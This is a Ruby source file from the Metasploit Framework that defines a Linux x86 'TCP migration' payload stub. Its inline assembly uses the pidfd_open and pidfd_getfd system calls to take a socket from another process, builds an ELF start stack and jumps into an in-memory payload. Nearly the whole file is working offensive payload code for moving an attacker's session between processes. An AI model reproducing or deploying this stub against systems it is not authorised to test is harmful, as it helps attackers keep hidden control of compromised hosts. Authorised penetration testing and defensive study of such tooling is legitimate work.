# -*- coding: binary -*-

require 'rex/elfparsey'

module Msf

###
#
# Payload that supports migration on x86.
#
###

module Payload::Linux::X86::MigrateTcp

  include Msf::Payload::Linux::X86::Migrate

  def initialize(info={})
    super(update_info(info,
      'Name'        => 'Linux TCP Migration (x86)',
      'Description' => 'Migration stub x86',
      'Author'      => ['OJ Reeves', 'msutovsky-r7'],
      'License'     => MSF_LICENSE,
      'Platform'    => 'linux',
      'Arch'        => ARCH_X86
    ))
  end

  def elf_ep(payload)
    elf = Rex::ElfParsey::Elf.new(Rex::ImageSource::Memory.new(payload))
    elf.elf_header.e_entry
  end

  #
  # Constructs the migrate stub on the fly
  #
  def generate_migrate(opts={})
    entry_offset = elf_ep(opts[:payload])
    %Q^
      ; --- pidfd_open(pid, 0) ---
      ; ebx = arg1 (pid), ecx = arg2 (flags)
      pop ebx
      xor ecx, ecx
      push 0x1b2
      pop eax
      int 0x80             ; pidfd_open -> eax = pidfd

      ; --- pidfd_getfd(pidfd, targetfd, 0) ---
      ; ebx = arg1 (pidfd), ecx = arg2 (targetfd), edx = arg3 (flags)
      pop ecx
      xchg ebx, eax
      xor edx, edx
      push 0x1b6
      pop eax
      int 0x80             ; pidfd_getfd -> eax = new_fd

      xchg edi, eax        ; edi = new_fd (duplicated socket)
      pop esi              ; esi = mmap base (payload address)

      ; setup stack for ELF _start
      and esp, -0x10       ; align
      add sp, 48           ; headroom for stack frame and prog name

      mov eax, 109         ; prog name "m"
      push eax
      mov ecx, esp         ; ecx = ptr to prog name

      xor ebx, ebx
      push ebx             ; AT_NULL value
      push ebx             ; AT_NULL type
      push esi             ; AT_BASE value (mmap base)
      mov eax, 7           ; AT_BASE type
      push eax
      push ebx             ; NULL (end of envp)
      push ebx             ; NULL (end of argv)
      push edi             ; argv[1] = sockfd
      push ecx             ; argv[0] = prog name ptr
      mov eax, 2           ; argc = 2
      push eax

      ; jump to ELF entry point
      mov eax, #{entry_offset}
      add esi, eax
      jmp esi
    ^
  end

end

end
